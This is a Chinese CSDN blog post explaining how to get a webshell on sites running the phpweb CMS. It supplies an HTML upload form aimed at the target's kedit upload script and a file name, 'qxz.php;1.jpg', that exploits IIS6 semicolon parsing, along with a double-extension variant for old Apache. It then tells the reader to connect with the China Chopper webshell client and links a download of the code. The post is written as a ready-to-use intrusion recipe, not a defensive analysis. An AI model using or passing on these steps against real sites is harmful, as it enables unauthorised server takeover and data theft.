# phpweb后台拿shell简单方法 - sxf_123456的博客 - CSDN博客
2017年04月24日 20:59:35[sxf_0123](https://me.csdn.net/sxf_123456)阅读数：3089
关于phpweb后台拿shell简单方法。
首先登录后台admin.php
![phpweb](http://www.chncto.com/upload/image/201403/2014030800203300.jpg)
登录后台管理系统后，然后把下面的文件保存为xxx.html，修改action，把 www.xxx.com 改成你的目标网站地址。 
代码文件如下：
<form name=”uploadForm” method=”post” enctype=”multipart/form-data” action=”http://www.xxx.com/kedit/upload_cgi/upload.php”> 
<input type=”text” name=”fileName” value=”qxz.php;1.jpg” /> 
<input type=”hidden” name=”attachPath” value=”news/pics/” /> 
<input type=”file” name=”fileData” size=”14″ /></td> 
<input type=”submit” name=”button” value=”确定” /> 
</form>
然后选择你的马儿再上传
![0131203233947](http://www.chncto.com/upload/image/201403/2014030800203501.jpg)
上传后如果为iis6，就点击查看源码就可以找到马儿的路径了。
![203233848](http://www.chncto.com/upload/image/201403/2014030800203702.jpg)
菜刀链接看下
![t234952](http://www.chncto.com/upload/image/201403/2014030800203903.jpg)
PS：qxz.php;1.jpg这样的文件是允许上传的，只要服务器是IIS6就拿到webshell，低版本的apache可以试着重命名为qxz.php.jpg
代码文件下载地址：http://pan.baidu.com/s/1eRzHs
